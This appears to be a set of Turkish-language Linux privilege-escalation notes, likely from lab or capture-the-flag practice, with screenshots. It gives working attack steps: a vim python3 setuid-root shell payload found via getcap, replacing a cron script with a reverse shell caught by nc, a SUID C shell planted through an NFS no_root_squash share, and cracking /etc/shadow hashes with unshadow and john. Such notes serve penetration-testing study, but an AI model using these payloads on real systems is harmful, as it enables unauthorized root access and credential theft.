Ayrıcalık Yükseltme Yetenekleri:

# getcap ile priv esc


```bash
getcap -r / 2>/dev/null
``` 
![image](https://github.com/user-attachments/assets/41681c69-e0f1-4cfd-9b96-1fd99781a0b2)

daha sonra

![image](https://github.com/user-attachments/assets/f433e7ef-4b5a-422f-882e-b293290ead65)

Vim'in aşağıdaki komut ve yük ile kullanılabileceğini fark ediyoruz:
```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
![image](https://github.com/user-attachments/assets/fda3d99b-ff2c-431b-8742-920c643d51a0)

---

# Cronjobs ile priv esc

```bash
cat /etc/crontab
```
![image](https://github.com/user-attachments/assets/0b0a0f38-b9c8-4955-9df3-fb418ce0768a)
backup.sh'ı görebiliyoruz içindekileri silip reverse bash shellimizi koyuyorzu ve nc ile dinliyoruz cronjob çalıştığı zaman shell gelicektir

Eğer backup.sh executable değil ise yürütülebilir yapıp yürütmeliyiz.

![image](https://github.com/user-attachments/assets/3f5f374f-507a-4f6e-89c7-aedca770a237)
 

---

# NFS (Ağ Dosya Paylaşımı) yapılandırması /etc/exports dosyasında tutulur.
```bash
cat /etc/exports
```
![image](https://github.com/user-attachments/assets/c82d3b7f-06d5-41d1-bd36-5a4486cac6fd)

Saldıran makinemizden bağlanabilir paylaşımları sayarak başlayacağız.

```bash
showmount -e [hedef_ip]
```
![image](https://github.com/user-attachments/assets/196a0842-5170-4d3f-be99-1369d61cb9a1)

Saldıracağımız makineye “no_root_squash” paylaşımlarından birini bağlayıp çalıştırılabilir dosyamızı oluşturmaya başlayacağız.
tmp içinde olmalı


![image](https://github.com/user-attachments/assets/0944424d-1742-40d7-9a31-3415a11af785)


sonra 


SUID bitlerini ayarlayabildiğimiz için hedef sistemde /bin/bash'i çalıştıracak basit bir çalıştırılabilir dosya işimizi görecektir.

![image](https://github.com/user-attachments/assets/dde4845c-94af-41e1-a82c-d190484f33e3)

```bash
/tmp/backupsonattackermachine içinde
# echo "int main(){setgid(0);setuid(0);system('/bin/bash');return 0;}" >> nfs.c
# gcc nfs.c -o nfs -w 
# chmod +s nfs   
# 
```

Kodu derlediğimizde SUID bitini ayarlayacağız.

![image](https://github.com/user-attachments/assets/2f97d0c4-0266-4fca-97a3-251db79a799f)


hedef sisteme atıyoruz nfs dosyasını 

daha sonra ./nfs olarak calıstıyoruz

---


# farklı kullanıcalara shadow ve passwd üzerinden erişim sağlama:

/etc/shadow ve /etc/passwd okuyabiliyorsak şu adımları izlemeliyiz

```bash
# cat /etc/shadow
# cat /etc/passwd
```
mesela missy kullanıcısına ait passwordu kırıcaz

okuduğumuz shadow ve passwdleri  passwd.txt ve shadow.txt içine atıyoruz
örn  
``` bash
# cat  passwd.txt   
missy:x:1001:1001::/home/missy:/bin/bash
```

``` bash
#cat shadow.txt 
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```
daha sonra shadowu kaldırmamız lazım 
``` bash
unshadow passwd.txt shadow.txt > cracked.txt
john --wordlist=/usr/share/wordlists/rockyou.txt cracked.txt
```
şifreyi kırdık 




















